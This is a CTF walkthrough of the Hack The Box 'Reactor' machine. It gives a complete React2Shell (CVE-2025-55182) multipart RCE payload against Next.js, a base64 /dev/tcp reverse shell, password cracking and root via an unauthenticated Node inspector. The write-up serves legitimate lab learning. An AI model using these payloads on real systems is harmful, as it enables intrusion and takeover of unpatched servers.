---
title: Reactor
summary: Hack The Box Linux machine exploiting the React2Shell pre-auth RCE (CVE-2025-55182) in a Next.js 15.0.3 app for a foothold, cracking an MD5 hash from a stray SQLite DB to move to engineer, then abusing an unauthenticated root Node.js --inspect debugger for root.
date: 2026-10-20
tags: [Hack The Box, Web, Next.js, React, RCE, Node.js, PrivEsc]
difficulty: medium
os: Linux
url: https://app.hackthebox.com/machines/Reactor
---

# CTF Room: Reactor
- [Link to machine](https://app.hackthebox.com/machines/Reactor)
- **Difficulty:** Medium
- **Category:** Web / PrivEsc
- **OS:** Linux

## 1. Brief
Reactor is a Next.js monitoring dashboard for a nuclear reactor. The front end is a dead-end with no links, but the React version it ships is vulnerable to React2Shell (CVE-2025-55182), a pre-auth RCE in React Server Components. I use that for a shell as `node`, crack a password out of an unused SQLite database to become `engineer`, then abuse a root-owned Node.js debugger listening on localhost to run code as root.

---

## 2. Recon

### NMAP Scan
```bash
sudo nmap -p- --min-rate 10000 machine_ip
```
```text
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

SSH and something on 3000. Running scripts/version detection:

```bash
sudo nmap -p 22,3000 -sCV machine_ip
```
```text
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: Next.js
...
```

nmap doesn't cleanly fingerprint 3000, but the response leaks everything I need: `X-Powered-By: Next.js` plus a pile of `Next-Router-*` and `x-nextjs-*` headers. So it's a Next.js app on 3000. The OpenSSH version lines up with Ubuntu 24.04 Noble, and both ports show TTL 63 - Linux, one hop away.

---

## 3. Enumeration - TCP 3000

### Site
The site is a monitoring dashboard for a nuclear reactor. It's completely static - no links, no forms, no interaction. Guessing index paths (`/index`, `/index.html`) gets nowhere, which is expected for Next.js since routes are defined in code, not on the filesystem. The 404 page is the stock Next.js 404.

### Directory brute force
`feroxbuster` only turns up the framework's own JavaScript chunks under `/_next/static/` - nothing application-specific:

```bash
feroxbuster -u http://machine_ip:3000
```
```text
200  GET  http://machine_ip:3000/_next/static/chunks/517-d083b552e04dead1.js
200  GET  http://machine_ip:3000/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js
200  GET  http://machine_ip:3000/_next/static/chunks/webpack-db0a529a99835594.js
200  GET  http://machine_ip:3000/
...
```

### Digging into the Next.js build
There's no `__NEXT_DATA__` object in the HTML, which means this is an **App Router** app (not Pages Router), so there's no easy `buildManifest` to pull. First thing worth checking is whether source maps are exposed - they'd let me rebuild the original source:

```bash
for f in $(curl -s http://machine_ip:3000 | grep -oE '/_next/static/[^"\\]+\.js'); do
  echo -n "$f.map -> "; curl -s -o /dev/null -w '%{http_code}\n' "http://machine_ip:3000$f.map"
done
```

All `.map` requests 404, so no luck there. I downloaded the five referenced JS files and beautified them:

```bash
for f in $(curl -s http://machine_ip:3000 | grep -oE '/_next/static/[^"\\]+\.js' | sort -u); do
  wget "http://machine_ip:3000$f"
done
npx js-beautify -r *.js
```

The `webpack-*.js` chunk map (`.u` / `.miniCssF`) is empty, confirming there are no lazily-loaded routes - the one dashboard page is all there is. Not much to attack in the app itself, so the useful move is just to pull out version strings:

```bash
grep -Eoi 'version\s?[:=]\s*"[^"]*"' *
```
```text
4bd1b696-...js:version: "19.0.0-rc-66855b96-20241106"
517-...js:version: "15.0.3"
polyfills-...js:version: "3.38.1"
```

That's the whole fingerprint:

- **Next.js 15.0.3** (the framework chunk stamps the exact build version - this is the server's version too, released mid-November 2024).
- **React 19.0.0-rc** (build `66855b96`, 2024-11-06), the RC that Next 15.0.x pins.
- **core-js 3.38.1** polyfills.

An App Router app on React 19 RC means React Server Components are in play - and a 15.0.3 build is well over a year stale, so it's a good bet nobody has patched the framework.

---

## 4. Foothold - React2Shell (CVE-2025-55182)

### The vulnerability
Searching "next.js 15.0.3 vulnerabilities" surfaces **CVE-2025-55182**, aka **React2Shell** (Vercel tracks the downstream Next.js impact as CVE-2025-66478, a duplicate that points at the same flaw). NIST describes it as:

> A pre-authentication remote code execution vulnerability exists in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 ... The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.

Pre-auth RCE, CVSS 10.0. The target is running React 19.0.0, squarely in range.

The bug is in the **Flight reply decoder** - Flight being React's wire format for Server Components, and the reply decoder being the half that parses data coming *from* the browser. By forging two internal React objects, you can confuse the decoder into compiling and calling an attacker-controlled function. The pieces:

- The decoder passes around a `Response` object (`{ _bundlerConfig, _prefix, _formData, _chunks }`).
- Each incoming field becomes a `Chunk` (`{ status, value, reason, _response }`).
- A `$` in a value references another field; `:` walks its properties. So `"$4:constructor:constructor"` on a field holding `[]` means `Array.constructor` - the **Function constructor**.

The exploit arranges for React to build a function via `Function(_prefix + id)` - where `_prefix` is my JavaScript and the trailing `id` is commented out with `//` - and then calls it by dressing a value up as both array-like and a thenable so React's `await` runs it. Only `_prefix` needs to change to control what runs.

### POC - proving RCE
The Server Function endpoint reads the body as form data, so I write the numbered POC fields as a multipart body (`r2s-body.txt`), which keeps the payload out of URL encoding:

```text
------R2S
Content-Disposition: form-data; name="0"

"$1"
------R2S
Content-Disposition: form-data; name="1"

{"status": "resolved_model", "reason": 0, "_response": "$5", "value": "{\"then\": \"$4:map\", \"0\": {\"then\": \"$B3\"}, \"length\": 1}", "then": "$2:then"}
------R2S
Content-Disposition: form-data; name="2"

"$@3"
------R2S
Content-Disposition: form-data; name="3"

""
------R2S
Content-Disposition: form-data; name="4"

[]
------R2S
Content-Disposition: form-data; name="5"

{"_prefix": "process.mainModule.require('child_process').execSync('ping -c 1 your_ip')//", "_formData": {"get": "$4:constructor:constructor"}, "_chunks": "$2:_response:_chunks", "_bundlerConfig": {}}
------R2S--
```

The payload loads `child_process` and pings my host. It has to reach the module loader the long way - the function is built in global scope where there's no `require`, but `process` is a true global, so `process.mainModule.require` gets to the loader. I send it with a `Next-Action` header (the value is irrelevant; the decoder runs before React validates the action ID):

```bash
curl --max-time 1 -X POST http://machine_ip:3000/ \
  -H "Next-Action: 0xdf" \
  -H "Content-Type: multipart/form-data; boundary=----R2S" \
  --data-binary @r2s-body.txt
```

The request times out - expected, since the forged thenable never resolves and React waits forever - but `tcpdump` catches the ping:

```bash
sudo tcpdump -ni tun0 icmp
```
```text
IP machine_ip > your_ip: ICMP echo request ...
```

RCE confirmed.

### Reverse shell
I swap the `ping` for a base64-encoded bash reverse shell. base64 can emit `+` and `/`, and `+` decodes to a space if the body ever gets treated as URL-encoded form data - so I pad the command with extra spaces until the output is clean of both:

```bash
echo 'bash  -i >& /dev/tcp/your_ip/443 0>&1  ' | base64
# YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTY5LzQ0MyAwPiYxICAK
```

New `_prefix` field:

```text
{"_prefix": "process.mainModule.require('child_process').execSync('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTY5LzQ0MyAwPiYxICAK | base64 -d | bash')//", "_formData": {"get": "$4:constructor:constructor"}, "_chunks": "$2:_response:_chunks", "_bundlerConfig": {}}
```

With `nc` listening on 443, fire it off:

```bash
curl --max-time 1 -X POST http://machine_ip:3000/ \
  -H "Next-Action: 0xdf" \
  -H "Content-Type: multipart/form-data; boundary=----R2S" \
  --data-binary @r2s-shell.txt
```
```text
node@reactor:/opt/reactor-app$
```

Shell as `node`. Upgrade it with the usual trick:

```bash
script /dev/null -c bash
# Ctrl-Z
stty raw -echo; fg
# reset ; screen
```

---

## 5. Lateral Movement - engineer

### Enumeration
`node`'s home is empty and `sudo -l` wants a password I don't have. There's one other user with a home and a shell - `engineer`:

```bash
cat /etc/passwd | grep 'sh$'
```
```text
root:x:0:0:root:/root:/bin/bash
engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
```

`/opt` has the app and an `uptime-monitor` directory (back to that for root). The app is in `/opt/reactor-app`:

```bash
ls /opt/reactor-app
# app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
```

`reactor.db` is odd - the site has no feature that would touch a database, and `package.json` lists no DB driver at all (just `next`, `react`, `react-dom`). Worth a look.

### The stray database
```bash
sqlite3 reactor.db
sqlite> .tables
sensor_logs  users
```

`sensor_logs` is boring (looks like the dashboard was meant to read it but the values got hardcoded instead). `users` is the prize:

```sql
sqlite> .headers on
sqlite> select * from users;
```
```text
id|username|password_hash|role|email
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Neither hash is used anywhere by the live site. They're 32 hex chars - MD5. Throwing both at CrackStation, only `engineer`'s cracks, to ||reactor1||.

### su / SSH
That's an application password, but `engineer` reused it for their system account, so it works with `su` and over SSH:

```bash
su - engineer
# Password: reactor1
```
```bash
sshpass -p '||reactor1||' ssh engineer@machine_ip
```
```text
engineer@reactor:~$ cat user.txt
||<user flag>||
```

---

## 6. Privilege Escalation - Node.js Inspector as root

### Enumeration
`engineer`'s home has a `.sudo_as_admin_successful` file (so they *used* to have sudo), but `sudo -l` now wants a password and sudo rights have been revoked. Back to `/opt/uptime-monitor`, which holds a single `worker.js`. It polls the website every 30 seconds and appends results to `/var/log/uptime-monitor.csv`. The code itself has nothing exploitable - but how it's *run* does:

```bash
ps auxww | grep worker.js
```
```text
root  1396  ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

It runs as **root** with `--inspect=127.0.0.1:9229`. Confirmed listening:

```bash
netstat -tnlp
# tcp  0  0 127.0.0.1:9229  0.0.0.0:*  LISTEN
```

### Why this is game over
`--inspect` opens Node's Inspector - the V8 debugger - speaking the Chrome DevTools Protocol over a WebSocket. CDP includes `Runtime.evaluate`, which runs arbitrary JavaScript inside the target process. **There's no authentication.** The only thing protecting it is the localhost bind, so anyone who can reach port 9229 runs code inside a root process.

Enumerate the available target:

```bash
curl localhost:9229/json/list
```
```json
[ {
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "webSocketDebuggerUrl": "ws://localhost:9229/f36940bd-09d1-46c6-b3f4-74c575af3d6d"
} ]
```

### Root via the node CLI client
Simplest path - attach with Node's own `node inspect` client and evaluate code. This works straight from the `node` shell too, so `engineer` isn't even strictly required:

```bash
node inspect 127.0.0.1:9229
```
```text
connecting to 127.0.0.1:9229 ... ok
debug> exec("process.mainModule.require('child_process').execSync('id').toString()")
'uid=0(root) gid=0(root) groups=0(root)\n'
```

Running as root. To get a persistent shell, I write my public SSH key into `/tmp/key` from the `engineer` shell (avoids fiddly quoting in the debugger), then have the root process append it to root's `authorized_keys`:

```bash
# in the debugger
exec("process.mainModule.require('fs').appendFileSync('/root/.ssh/authorized_keys', require('fs').readFileSync('/tmp/key'))")
```

Then SSH in as root:

```bash
ssh -i ~/keys/ed25519_gen root@machine_ip
```
```text
root@reactor:~# cat root.txt
||<root flag>||
```

> **Note:** Alternatively, tunnel 9229 back with `ssh -L 9229:localhost:9229` and attach with Chromium at `chrome://inspect` for a full, non-blind DevTools console against the root process.

---

## 7. Flags / Proof

| Flag | Value |
|:--|:--|
| User flag | `||<user flag>||` |
| Root flag | `||<root flag>||` |

---

## 8. Summary
Reactor is a clean modern-web chain:

- **Know your framework fingerprints.** A couple of version strings grepped out of the Next.js chunks (Next 15.0.3 + React 19.0.0-rc) were enough to identify a pre-auth RCE with zero site interaction. React2Shell (CVE-2025-55182) abuses unsafe deserialization in the RSC Flight decoder - forging internal objects to reach the Function constructor and run code before any auth check.
- **Loot everything, even unused files.** The site never touched `reactor.db`, but it held a reusable MD5 password for `engineer`.
- **A debugger is an RCE primitive.** `node --inspect` with no auth, running as root, is arbitrary code execution for anyone who can reach the port - localhost binding is not a security control when local users exist.

**Tools used:** `nmap`, `feroxbuster`, `curl`, `js-beautify`, `tcpdump`, `nc`, `sqlite3`, CrackStation, `sshpass`, `node inspect`.
